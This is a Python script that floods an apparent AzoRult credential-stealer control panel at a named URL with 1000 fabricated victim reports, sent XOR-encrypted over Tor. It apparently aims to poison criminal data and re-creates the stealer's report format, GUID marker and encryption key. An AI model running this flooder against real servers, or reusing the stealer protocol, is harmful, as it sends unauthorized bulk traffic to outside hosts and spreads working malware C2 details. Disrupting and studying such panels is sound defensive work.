import random, string
from ipaddress import IPv4Address
from random import getrandbits
from time import gmtime, strftime
import urllib
import urllib2
import os
import shutil
import socks
from sockshandler import SocksiPyHandler # pip install PySocks


fileFirstnames = "first-names.txt"
fileLastnames = "last-names.txt"
fileEmails = "mail-domains.txt"
fileDomains = "domains.txt"
fileCountrycodes = "iso_country_codes.txt"
fileSoftware = "applications.txt"

glob_hostname = ""
glob_username = ""
glob_email = ""
glob_guid = ""
glob_windowsversion = []
glob_cookiedomains = []
glob_ip = ""
glob_countrycode = ""
glob_fakecredentials = []
glob_fakesysteminfo = ""
glob_architecture = ""

fake_reports = 1000
glob_count_fake_credentials = 0

# Defined in index.php of the panel; Seems to be static at least all samples I saw had the same guid
unical_guid = "DV8CF101-053A-4498-98VA-EAB3719A088W-VF9A8B7AD-0FA0-4899-B4RD-D8006738DQCD"

xor_key = chr(13) + chr(10) + chr(200)

url = "http://lusecproducts.top/ebuka/index.php"


def create_zip():
    if os.path.isdir("output"):
        shutil.rmtree("output")

    os.makedirs("output/Browsers/AutoComplete")
    os.makedirs("output/Browsers/Cookies")
    os.makedirs("output/Browsers/History")

    # Cookies:
    fileCookieList = open("output/CookieList.txt", "w")
    for cookie in glob_cookiedomains:
        fileCookieList.write(cookie + "\n")
    fileCookieList.close()

    # IP / Countrycode:
    fileip = open("output/ip.txt", "w")
    fileip.write(glob_ip + ":" + glob_countrycode)
    fileip.close()

    # Credentials:
    filePasswordsList = open("output/PasswordsList.txt", "w")
    credentials = ""

    for cred in glob_fakecredentials:
        temp = ""
        temp += "SOFT:\t\t" + cred[1] + "\n"
        temp += "HOST:\t\t" + cred[2] + "\n"
        temp += "USER:\t\t" + cred[3] + "\n"
        temp += "PASS:\t\t" + cred[4] + "\n"
        temp += "UNKN:\t\t\n\n"

        credentials += temp

    filePasswordsList.write(credentials)
    filePasswordsList.close()

    # Systeminfo:
    fileSystem = open("output/System.txt", "w")
    fileSystem.write(glob_fakesysteminfo)
    fileSystem.close()

    # Create empty files - will be added in a future version:
    with open("output/Browsers/AutoComplete/GoogleChrome_Default.txt", 'a'):
        os.utime("output/Browsers/AutoComplete/GoogleChrome_Default.txt", None)

    with open("output/Browsers/AutoComplete/GoogleChrome_Default.txt", 'a'):
        os.utime("output/Browsers/AutoComplete/GoogleChrome_Default.txt", None)

    with open("output/Browsers/Cookies/GoogleChrome_Default.txt", 'a'):
        os.utime("output/Browsers/Cookies/GoogleChrome_Default.txt", None)
        
    with open("output/Browsers/Cookies/InternetExplorer.txt", 'a'):
        os.utime("output/Browsers/Cookies/InternetExplorer.txt", None)

    with open("output/Browsers/Cookies/InternetExplorerLow.txt", 'a'):
        os.utime("output/Browsers/Cookies/InternetExplorerLow.txt", None)

    with open("output/Browsers/History/GoogleChrome_Default.txt", 'a'):
        os.utime("output/Browsers/History/GoogleChrome_Default.txt", None)

    shutil.make_archive("output", "zip", "output")


def cleanup_files():
    # Temporary encrypted file which is sent to server
    if os.path.exists("output.dat"):
        os.remove("output.dat")
    if os.path.exists("output.zip"):
        os.remove("output.zip")

    # Delete temp folder which was used as base for the zip
    shutil.rmtree("output")


def CB_XORm(data, key, max):
    datalen = len(data);
    keylen = len(key);
    if (datalen >= max):
        datalen = max;

    j = 0;
    i = 0;

    while i < datalen:
        data[i] = chr(data[i] ^ ord(key[j]));
        j = j + 1;
        if (j > (keylen - 1)):
            j = 0;
        i = i + 1;
    return data;


def create_fakearchitecture():
    bool = random.randint(0,1)
    if bool == 0:
        return "x64"
    else:
        return "x32"
    

def write_outputfile():
    # Info part:
    outputfile = ""
    outputfile += "<info" + unical_guid + ">" + glob_guid + "|" + glob_windowsversion[1] + "|" + glob_windowsversion[0] + "|"
    outputfile += glob_architecture + "|" + glob_hostname + "|" + glob_username + "|" + str(glob_count_fake_credentials) + "|"
    outputfile += "0|0|0|" # BTC | CC | Files - Will be added in future release
    outputfile += "E|" # Executable

    bool = random.randint(0,1)
    if bool == 0:
        outputfile += "U" # User
    else:
         outputfile += "A" # Admin
    outputfile += "</info" + unical_guid + ">"

    # pwd part:
    '''
    Types:
    1 = Browsers
    2 = FTP Clients
    3 = Mail Clients
    4 = IM Clients
    '''
    outputfile += "<pwds" + unical_guid + ">"

    '''
    cred = []
        cred.append(random.randint(1, 4))
        cred.append(soft)
        cred.append(host)
        cred.append(username)
        cred.append(password)
    '''
    for cred in glob_fakecredentials:
        outputfile += str(cred[0]) + "|" + cred[1] + "|" + cred[2] + "|" + cred[3] + "|" + cred[4] + "|\r\n"

    outputfile += "</pwds" + unical_guid + ">"

    # Cookies Part:
    outputfile += "<coks" + unical_guid + ">"
    for cookie in glob_cookiedomains:
        outputfile += cookie + "\r\n"
    outputfile += "</coks" + unical_guid + ">"

    # File Part:
    outputfile += "<file" + unical_guid + ">"
    f = open("output.zip", "rb")
    outputfile += f.read()
    outputfile += "</file" + unical_guid + ">"

    resultfile = open("output.dat", "w")
    resultfile.write(outputfile)

    return urllib.quote(outputfile)


def create_fakeversion():
    p1 = random.randint(1,16)
    p2 = random.randint(1, 4000)
    p3 = random.randint(1, 9999)
    p4 = random.randint(1, 9999)

    return str(p1) + "." + str(p2) + "." + str(p3) + "." + str(p4)


def create_fakesysteminfo():
    fake_filename = create_fakepassword() + ".exe"
    possible_software = []
    installed_software = []

    fakesysteminfo = ""
    fakesysteminfo += "E\n"
    fakesysteminfo += "MachineID\t:\t" + glob_guid + "\n"
    fakesysteminfo += "EXE_PATH\t:\tC:\\Users\\" + glob_username + "\\AppData\\Local\\Temp\\" + fake_filename + "\n"
    fakesysteminfo += "\n"
    fakesysteminfo += "Windows\t:\t" + glob_windowsversion[1] + " " + glob_windowsversion[0] + "\n"
    fakesysteminfo += "Computer(Username)\t:\t" + glob_hostname + "(" + glob_username + ")" + "\n"
    fakesysteminfo += "Screen: 1680x1050\n"
    fakesysteminfo += "Layouts: EN/" + glob_countrycode.upper() + "\n"
    fakesysteminfo += "LocalTime: " + strftime("%d/%m/%Y %H:%M:%S", gmtime()) + "\n"
    fakesysteminfo += "Zone: UTC+" + str(random.randint(1,5)) + ":0" + "\n"
    fakesysteminfo += "\n"
    fakesysteminfo += "CPU Model: Intel(R)" + "\n"
    fakesysteminfo += "CPU Count: 2\n"
    fakesysteminfo += "GetRAM: 4096\n"
    fakesysteminfo += "Video Info\n"
    fakesysteminfo += "Default VGA Graphics Adapter\n"
    fakesysteminfo += "RDPDD Chained DD\n"
    fakesysteminfo += "RDP Encoder Mirror Driver\n"
    fakesysteminfo += "RDP Reflector Display Driver\n"
    fakesysteminfo += "\n\n"

    fakesysteminfo += "[System Process]\n"
    fakesysteminfo += "System\n"
    fakesysteminfo += "\t\tsmss.exe\n"
    fakesysteminfo += "csrss.exe\n"
    fakesysteminfo += "wininit.exe\n"
    fakesysteminfo += "\tservices.exe\n"
    fakesysteminfo += "\t\tsvchost.exe\n"
    fakesysteminfo += "\t\t\tWmiPrvSE.exe\n"
    fakesysteminfo += "\t\tsvchost.exe\n"
    fakesysteminfo += "\t\tsvchost.exe\n"
    fakesysteminfo += "\t\t\taudiodg.exe\n"
    fakesysteminfo += "\t\tsvchost.exe\n"
    fakesysteminfo += "\t\t\tdwm.exe\n"
    fakesysteminfo += "\t\tsvchost.exe\n"
    fakesysteminfo += "\t\t\ttaskeng.exe\n"
    fakesysteminfo += "\t\tsvchost.exe\n"
    fakesysteminfo += "\t\tspoolsv.exe\n"
    fakesysteminfo += "\t\tsvchost.exe\n"
    fakesysteminfo += "\t\tsvchost.exe\n"
    fakesysteminfo += "\t\tsvchost.exe\n"
    fakesysteminfo += "\t\tsppsvc.exe\n"
    fakesysteminfo += "\t\tSearchIndexer.exe\n"
    fakesysteminfo += "\t\tsvchost.exe\n"
    fakesysteminfo += "\t\ttaskhost.exe\n"
    fakesysteminfo += "\t\twmpnetwk.exe\n"
    fakesysteminfo += "\tlsass.exe\n"
    fakesysteminfo += "\tlsm.exe\n"
    fakesysteminfo += "csrss.exe\n"
    fakesysteminfo += "\tconhost.exe\n"
    fakesysteminfo += "winlogon.exe\n"
    fakesysteminfo += "explorer.exe\n"
    fakesysteminfo += "\tchrome.exe\n"
    fakesysteminfo += "\t\tchrome.exe\n"
    fakesysteminfo += "\t\tchrome.exe\n"
    fakesysteminfo += "\t\tchrome.exe\n"
    fakesysteminfo += "\t" + fake_filename + "\n"
    fakesysteminfo += "\n\n"
    fakesysteminfo += "[SOFT]\n\n"

    with open(fileSoftware) as sName:
        possible_software = sName.read().splitlines()

    for s in possible_software:
        bool = random.randint(0,1)
        if bool == 1:
            installed_software.append(s.strip() + " (" + create_fakeversion() + ")")

    for soft in installed_software:
        fakesysteminfo += soft + "\n"

    return fakesysteminfo


def create_fakepassword():
    min_length = 4
    max_length = 12

    actual_length = random.randint(min_length, max_length)

    x = ''.join(
        random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(actual_length))

    return x


def create_fakecredentialdomain():
    rand_domain = random.randint(0, len(glob_cookiedomains) - 1)
    return glob_cookiedomains[rand_domain]


def create_fakecredentials():
    '''
    Types:
    1 = Browsers
    2 = FTP Clients
    3 = Mail Clients
    4 = IM Clients
    '''
    fake_credentials = []

    password_type = ["7Star",
                     "360Browser",
                     "Amigo",
                     "Brave",
                     "Bromium",
                     "CentBrowser",
                     "Chedot",
                     "Chromium",
                     "CocCoc",
                     "ComodoDragon",
                     "Cyberfox",
                     "ElementsBrowser",
                     "Epic",
                     "FileZilla",
                     "GoBrowser",
                     "GoogleChrome",
                     "GoogleChrome64",
                     "IceDragon",
                     "InternetExplorer",
                     "InternetMailRu",
                     "Kometa",
                     "MicrosoftEdge",
                     "MozillaFireFox",
                     "Mustang",
                     "Nichrome",
                     "Opera",
                     "Orbitum",
                     "Outlook",
                     "PaleMoon",
                     "Pidgin",
                     "Psi",
                     "PsiPlus",
                     "QIPSurf",
                     "RockMelt",
                     "SaferBrowser",
                     "Sputnik",
                     "Suhba",
                     "Superbird",
                     "ThunderBird",
                     "TorBro",
                     "Torch",
                     "Uran",
                     "Vivaldi",
                     "Waterfox",
                     "WinSCP",
                     "YandexBrowser"]

    number_credentials = random.randint(7, 20)
    global glob_count_fake_credentials
    glob_count_fake_credentials = number_credentials

    i = 0
    while i <= number_credentials:
        soft = password_type[random.randint(0, len(password_type) - 1)]
        host = create_fakecredentialdomain()
        username = create_username()
        password = create_fakepassword()

        cred = []
        cred.append(random.randint(1, 4))
        cred.append(soft)
        cred.append(host)
        cred.append(username)
        cred.append(password)

        fake_credentials.append(cred)
        i = i + 1

    return fake_credentials


def create_countrycode():
    country_codes = []
    with open(fileCountrycodes) as cName:
        country_codes = cName.read().splitlines()

    glob_countrycode = country_codes[random.randint(0, len(country_codes) - 1)]
    return glob_countrycode


'''
Source: https://codereview.stackexchange.com/questions/200337/random-ip-address-generator
'''
def create_fakeip():
    bits = getrandbits(32)  # generates an integer with 32 random bits
    addr = IPv4Address(bits)  # instances an IPv4Address object from those bits
    addr_str = str(addr)  # get the IPv4Address object's string representation

    glob_ip = addr_str
    return glob_ip


''' 
Inside the ZIP file which is transferred to AzoRult panel there is a text file with cookie domains which we 
generate here
'''
def create_cookielist():
    cookie_count = random.randint(30, 120)
    input_domains = []
    output_domains = []

    with open(fileDomains) as cName:
        input_domains = cName.read().splitlines()

    i = 0
    while i <= cookie_count:
        rand_domain = random.randint(0, len(input_domains) - 1)
        output_domains.append(input_domains[rand_domain])
        i = i + 1

    glob_cookiedomains = output_domains
    return glob_cookiedomains


''' 
Version codes taken from https://docs.microsoft.com/en-us/windows/desktop/sysinfo/operating-system-version
For the sake of simplicity I did not add Windows XP 64 Bit since it has another version code than 32 bit version
and the processor architecture is generated elsewhere in this script and has to fit the version code to not be suspicous
'''
def create_windsversion():
    versions = [["Windows 10", "10.0"],
                ["Windows Server 2019", "10.0"],
                ["Windows Server 2016", "10.0"],
                ["Windows 8.1", "6.3"],
                ["Windows Server 2012 R2", "6.3"],
                ["Windows 8", "6.2"],
                ["Windows Server 2012", "6.2"],
                ["Windows 7", "6.1"],
                ["Windows Server 2008 R2", "6.1"],
                ["Windows Server 2008", "6.0"],
                ["Windows Vista", "6.0"],
                ["Windows Server 2003 R2", "5.2"],
                ["Windows Server 2003", "5.2"],
                ["Windows XP", "5.1"]]

    glob_windowsversion = versions[random.randint(0, len(versions) - 1)]
    return glob_windowsversion


''' Here we generate our pseudo random Guid which will later be used to post the report to the panel'''
def create_guid():
    # Sample: 3BF5F2C-1343A2EC-6F2D975A-27E28A13-6E1212342
    # The different parts have different lengths which are defined here:
    part_lengths = [7,8,8,8,8,9]
    guid = ""

    for length in part_lengths:
        x = ''.join(random.choice("ABCDEFGH0123456789") for n in range(length))

        # Only add the dash if it is NOT the last part of the Guid:
        if length != 9:
            guid = guid + x + "-"
        else:
            guid = guid + x

    glob_guid = guid
    return glob_guid


def create_hostname():
    prefixes = ['WIN-', 'Dev-', 'SRV', '']
    rand_prefix = random.randint(0,3)

    min_length = 4
    max_length = 12

    actual_length = random.randint(min_length, max_length)

    x = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(actual_length))

    glob_hostname = prefixes[rand_prefix] + x
    return glob_hostname


def create_username():
    with open(fileFirstnames) as fName:
        firstnames = fName.read().splitlines()

    with open(fileLastnames) as lName:
        lastnames = lName.read().splitlines()

    rand_firstname = random.randint(0, len(firstnames) - 1)
    rand_lastname = random.randint(0, len(lastnames) - 1)

    rand_username_format = random.randint(0,2)

    if rand_username_format == 0:
        glob_username = firstnames[rand_firstname] + "." + lastnames[rand_lastname]
    elif rand_username_format == 1:
        glob_username = firstnames[rand_firstname][0] + lastnames[rand_lastname]
    elif rand_username_format == 2:
        glob_username = lastnames[rand_lastname] + firstnames[rand_firstname][0]
    return glob_username


def create_mailaddress():
    with open(fileEmails) as fEmails:
        emails = fEmails.read().splitlines()

    glob_email = glob_username + "@" + emails[random.randint(0, len(emails) - 1)]
    return glob_email

i = 0

while i < fake_reports:
    try:
        glob_hostname = create_hostname()
        glob_username = create_username()
        glob_email = create_mailaddress()
        glob_guid = create_guid()
        glob_windowsversion = create_windsversion()
        glob_cookiedomains = create_cookielist()
        glob_ip = create_fakeip()
        glob_countrycode = create_countrycode()
        glob_fakecredentials = create_fakecredentials()
        glob_fakesysteminfo = create_fakesysteminfo()
        glob_architecture = create_fakearchitecture()

        # Add all our informations to a ZIP file
        create_zip()

        # Write the unencrypted POST data to a file
        write_outputfile()

        # Read the file as byte array
        input_byte = bytearray(open("output.dat", 'rb').read())

        # Apply XOR key to our bytearray
        result = CB_XORm(input_byte, xor_key, 1024*512)

        # Post the result to the panel
        opener = urllib2.build_opener(SocksiPyHandler(socks.SOCKS5, "127.0.0.1", 9050))
        req = urllib2.Request(url, result, {'Content-Type': 'application/octet-stream'})
        #reply = urllib2.urlopen(req)
        opener.open(req)
        i = i + 1
        print("[" + str(i) + " / " + str(fake_reports) + "] Report sent to " + url)
    except Exception as e:
        print "An error occured: " + str(e)


